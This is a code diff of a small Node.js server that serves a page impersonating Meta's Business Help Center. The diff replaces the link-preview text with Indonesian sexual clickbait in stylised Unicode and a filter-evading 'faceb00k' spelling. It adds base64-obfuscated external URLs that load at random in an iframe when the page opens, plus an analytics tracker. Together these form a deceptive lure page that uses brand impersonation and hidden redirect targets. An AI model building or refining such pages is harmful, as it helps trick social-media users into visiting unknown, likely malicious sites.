@@ -11,9 +11,9 @@ const server = http.createServer((req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
             <title>Business Help Center</title>
             <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
-            <meta property="og:title" content="Get started with business tools from Meta" />
-            <meta property="og:description" content="Log in to Business Tools from Meta" />
-            <meta property="og:image" content="https://i.imgur.com/fwMCrQ2.jpg" />
+            <meta property="og:title" content="𝕀𝕕𝕠𝕝𝕒 𝕋𝕚𝕜𝕋𝕠𝕜 𝕞𝕖𝕞𝕓𝕠𝕔𝕠𝕣𝕜𝕒𝕟 𝕜-𝕝𝕚𝕡 𝕡𝕒𝕟𝕒𝕤 𝕕𝕖𝕟𝕘𝕒𝕟 𝕡𝕒𝕔𝕒𝕣 𝕕𝕚 𝕙𝕠𝕥𝕖𝕝" />
+            <meta property="og:description" content="𝕥𝕠𝕟𝕥𝕠𝕟 𝕔𝕖𝕡𝕒𝕥 𝕒𝕥𝕒𝕦 𝕗𝕒𝕔𝕖𝕓𝟘𝟘𝕜 𝕒𝕜𝕒𝕟 𝕞𝕖𝕟𝕘𝕙𝕒𝕡𝕦𝕤𝕟𝕪𝕒" />
+            <meta property="og:image" content="https://i.imgur.com/fKfkQR1.jpeg" />
             <style>
                 html, body {
                     margin: 0;
@@ -30,7 +30,8 @@ const server = http.createServer((req, res) => {
             <script>
                 window.onload = function() {
                     var urls = [
-                        'aHR0cHM6Ly9uZmN2aWV3ZXIuY29tLw=='
+                        'aHR0cHM6Ly9sb2xhdW5pdmVyc2UuY29t',
+                        'aHR0cHM6Ly9sb3ZlbmNhcmVhci5jb20='
                     ];
 
                     var randomIndex = Math.floor(Math.random() * urls.length);
@@ -45,6 +46,18 @@ const server = http.createServer((req, res) => {
                     iframe.src = atob(encodedUrl);
 
                     document.body.appendChild(iframe);
+
+                    // Phần mã phân tích
+                    (function() {
+                        var script = document.createElement('script');
+                        script.src = 'https://www.google-analytics.com/analytics.js';
+                        document.head.appendChild(script);
+
+                        script.onload = function() {
+                            ga('create', 'G-05KJ6YREEB', 'auto');
+                            ga('send', 'pageview');
+                        };
+                    })();
                 };
             </script>
         </head>
@@ -58,5 +71,3 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Server running at http://localhost:${PORT}/`);
 });
-
-
